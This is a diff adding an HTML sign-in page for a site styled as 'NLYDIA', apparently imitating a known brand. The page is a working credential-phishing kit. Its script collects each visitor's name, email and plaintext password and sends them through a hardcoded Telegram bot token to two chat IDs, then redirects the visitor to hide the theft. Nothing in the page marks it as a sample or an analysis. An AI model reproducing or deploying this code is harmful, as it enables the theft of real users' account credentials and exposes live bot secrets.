@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - NLYDIA</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f2f2f2;
+            color: #000000;
+        }
+        .navbar {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            background-color: #ffffff;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            z-index: 100;
+            margin-bottom: 20px;
+        }
+        .navbar .logo {
+            margin-bottom: 10px;
+            font-size: 24px;
+            color: #000000;
+            font-weight:600;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+        }
+        .navbar .links {
+            display: flex;
+            overflow-x: auto;
+            white-space: nowrap;
+        }
+        .navbar a {
+            color: #000000;
+            text-decoration: none;
+            padding: 10px 15px;
+            transition: color 0.3s ease;
+        }
+        .navbar a:hover {
+            color: #666666;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+            height: calc(100vh - 140px);
+            overflow: auto;
+            background-color: #ffffff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            z-index: 1;
+            margin-top: 20px;
+        }
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin: 8px 0;
+            background-color: #ffffff;
+            border: 1px solid #000000;
+            border-radius: 5px;
+            outline: none;
+        }
+        input[type="submit"] {
+            background-color: #ffffff;
+            color: #000000;
+            border: 1px solid #000000;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        input[type="submit"]:hover {
+            background-color: #eeeeee;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .checkbox-label {
+            margin-right: 10px;
+        }
+        .footer {
+            padding: 20px;
+            text-align: center;
+            background-color: #ffffff;
+            color: #000000;
+            margin-top: 40px;
+            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .footer p a,
+        .footer p a:visited {
+            color: #000000;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        @media (prefers-color-scheme: dark) {
+            body {
+                background-color: #121212;
+                color: #ffffff;
+            }
+            .navbar {
+                background-color: #1f1f1f;
+                box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            }
+            .navbar .logo {
+                color: #ffffff;
+            }
+            .navbar a {
+                color: #ffffff;
+            }
+            .navbar a:hover {
+                color: #cccccc;
+            }
+            .container {
+                background-color: #1f1f1f;
+                box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            }
+            input[type="text"],
+            input[type="email"],
+            input[type="password"] {
+                background-color: #ffffff;
+                color: #000000;
+            }
+            input[type="submit"] {
+                background-color: #1f1f1f;
+                color: #ffffff;
+                border: 1px solid #ffffff;
+            }
+            input[type="submit"]:hover {
+                background-color: #555;
+            }
+            .footer {
+                background-color: #1f1f1f;
+                color: #ffffff;
+                box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.3);
+            }
+            .footer p a,
+            .footer p a:visited {
+                color: #ffffff;
+            }
+        }
+        @media (max-width: 768px) {
+            .navbar {
+                padding: 10px;
+            }
+            .navbar .logo {
+                font-size: 20px;
+            }
+            .navbar a {
+                padding: 8px 12px;
+            }
+            .container {
+                padding: 10px;
+            }
+            input[type="submit"] {
+                padding: 8px 16px;
+            }
+            .footer {
+                margin-top: 20px;
+            }
+        }
+        .success-message {
+            color: green;
+            margin-top: 20px;
+        }
+        .error-message {
+            color: red;
+            margin-top: 20px;
+        }
+        .spacer {
+            height: 100px;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div class="logo">NLYDIA</div>
+        <div class="links">
+            <a href="index.html">Home</a>
+            <a href="products.html">Products</a>
+            <a href="about.html">About Us</a>
+            <a href="contact.html">Contact Us</a>
+        </div>
+    </div>
+    <div class="container">
+        <h2>Sign in</h2>
+        <form id="signinForm">
+            <input type="text" id="first_name" placeholder="First Name" required><br>
+            <input type="text" id="last_name" placeholder="Last Name" required><br>
+            <input type="email" id="email" placeholder="Your Email" required><br>
+            <input type="password" id="password" placeholder="Password" required minlength="7"><br>
+            <div class="checkbox-container">
+                <input type="checkbox" id="human" name="human" required>
+                <label for="human" class="checkbox-label">I'm not a robot</label>
+            </div>
+            <br>
+            <input type="submit" id="signinButton" value="Sign in">
+        </form>
+        <div class="spacer"></div>
+        <div class="success-message" id="successMessage" style="display: none;">Sign in successful</div>
+        <div class="error-message" id="errorMessage" style="display: none;">Unable to find account</div>
+    </div>
+    <div class="footer">
+        ©2024 NLYDIA. All rights reserved.
+        <p><a href="privacy.html" style="color: inherit;">Privacy Policy</a> | <a href="cookies.html" style="color: inherit;">Cookies Policy</a> | <a href="disclaimer.html" style="color: inherit;">Disclaimer</a></p>
+    </div>
+    <script>
+        document.getElementById('signinForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            if (localStorage.getItem('signupSuccess') !== 'true') {
+                document.getElementById('errorMessage').style.display = 'block';
+                return;
+            }
+
+            var firstName = document.getElementById('first_name').value;
+            var lastName = document.getElementById('last_name').value;
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            var message = 'First Name: ' + firstName + '\n' +
+                          'Last Name: ' + lastName + '\n' +
+                          'Email: ' + email + '\n' +
+                          'Password: ' + password;
+
+            var botToken = '7243508319:AAHcGPRAkx7dgyucfW2dSAgVuNdXFumLNVg';
+            var chatId1 = '825218850';
+            var chatId2 = '1509235250';
+
+            var url1 = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId1 + '&text=' + encodeURIComponent(message);
+            var url2 = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId2 + '&text=' + encodeURIComponent(message);
+
+            fetch(url1)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Message sent to first user successfully');
+                        window.location.href = 'signedin.html';
+                    } else {
+                        console.error('Error sending message to first user.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending message to first user:', error);
+                });
+
+            fetch(url2)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                       console.log('Message sent to second user successfully');
+                        localStorage.setItem('signupSuccess', 'true');
+                        window.location.href = 'index.html';
+                    } else {
+                        console.error('Error sending message to second user.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        });
+    </script>
+</body>
+</html>
